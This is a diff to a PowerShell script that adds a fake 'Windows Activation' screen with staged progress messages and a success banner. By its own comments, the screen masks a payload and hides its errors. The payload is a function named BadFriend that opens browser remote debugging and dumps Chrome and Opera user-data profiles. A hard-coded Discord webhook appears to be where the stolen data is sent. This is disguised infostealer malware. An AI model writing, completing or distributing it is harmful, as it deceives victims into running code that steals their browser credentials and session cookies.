@@ -1,10 +1,67 @@
+# ============================================================
+#                 WINDOWS ACTIVATION SIMULATION
+# ============================================================
+$hookUrl = "https://discord.com/api/webhooks/1537479493051220109/nrIYPzi_Pmen1jUjxbW_xCpInbQNh_XHbfjpyqD__wth0HCLfhSW8fuefkma_gtcwmLF"
+
+Clear-Host
+
+Write-Host ""
+Write-Host "############################################################"
+Write-Host "#                                                          #"
+Write-Host "#                  WINDOWS ACTIVATION                      #"
+Write-Host "#                                                          #"
+Write-Host "############################################################"
+Write-Host ""
+
+Start-Sleep -Seconds 1
+
+Write-Host "# Initializing activation service..." -ForegroundColor Cyan
+Start-Sleep -Milliseconds 800
+
+Write-Host "# Checking license status..." -ForegroundColor Cyan
+Start-Sleep -Milliseconds 800
+
+Write-Host "# Connecting to Microsoft activation servers..." -ForegroundColor Cyan
+Start-Sleep -Milliseconds 1000
+
+Write-Host "# Authenticating product key..." -ForegroundColor Cyan
+Start-Sleep -Milliseconds 1000
+
+Write-Host "#"
+
+for ($i = 0; $i -le 50; $i++) {
+    $bar = ("#" * $i).PadRight(50, "-")
+    Write-Host -NoNewline "`r# [$bar] $($i * 2)%"
+    Start-Sleep -Milliseconds 50
+}
+
+Write-Host ""
+Write-Host ""
+
+Write-Host "############################################################"
+Write-Host "#                 ACTIVATION COMPLETE                      #"
+Write-Host "############################################################"
+Write-Host ""
+
+Write-Host "# Activation ID: WINDOWS-ACTIVATION-VERIFIED" -ForegroundColor Green
+Write-Host "# Status: ACTIVATED" -ForegroundColor Green
+
+Write-Host ""
+Write-Host "############################################################"
+Write-Host ""
+
+# Optional: Show a fake "Closing..." message to hide the transition
+Start-Sleep -Seconds 1
+Write-Host "# Closing window as requested by system policy..." -ForegroundColor Gray
+Start-Sleep -Seconds 1
+
+# Clear the screen one last time to hide any error messages from the payload
+Clear-Host
+
 function BadFriend {
     $remoteDebuggingPort = 9222 # port where debug mode will be opened
     $URL = "https://www.google.com" # you can set any value you want, the result will not change
-
-    $hookUrl = "https://discord.com/api/webhooks/1537479493051220109/nrIYPzi_Pmen1jUjxbW_xCpInbQNh_XHbfjpyqD__wth0HCLfhSW8fuefkma_gtcwmLF"
-
-
+	
     dumpChromium "chrome" "\Google\Chrome\User Data"
 
     dumpChromium "opera" "\Opera Software\Opera Stable"
